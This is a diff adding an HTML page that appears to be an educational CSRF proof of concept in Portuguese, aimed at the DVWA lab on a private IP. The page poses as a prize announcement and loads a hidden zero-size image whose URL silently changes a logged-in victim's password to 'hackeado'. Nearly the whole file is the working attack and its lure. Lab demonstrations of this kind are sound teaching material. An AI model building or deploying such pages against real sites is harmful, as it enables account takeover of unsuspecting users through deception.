@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Você ganhou um prêmio!</title>
+</head>
+<body>
+    <!--
+        CSRF Attack PoC - Demonstração Educacional
+        ⚠️ APENAS PARA USO EM AMBIENTE CONTROLADO (DVWA/Metasploitable)
+        
+        Quando a vítima abre esta página estando logada no DVWA,
+        a senha dela é automaticamente trocada para "hackeado"
+        sem qualquer interação ou consentimento.
+    -->
+    
+    <h1>🎉 Parabéns! Você foi selecionado!</h1>
+    <p>Carregando seu prêmio...</p>
+    
+    <!-- Imagem invisível que executa a troca de senha -->
+    <img src="http://192.168.56.101/dvwa/vulnerabilities/csrf/?password_new=hackeado&password_conf=hackeado&Change=Change"
+         width="0" height="0" style="display:none;" />
+</body>
+</html>
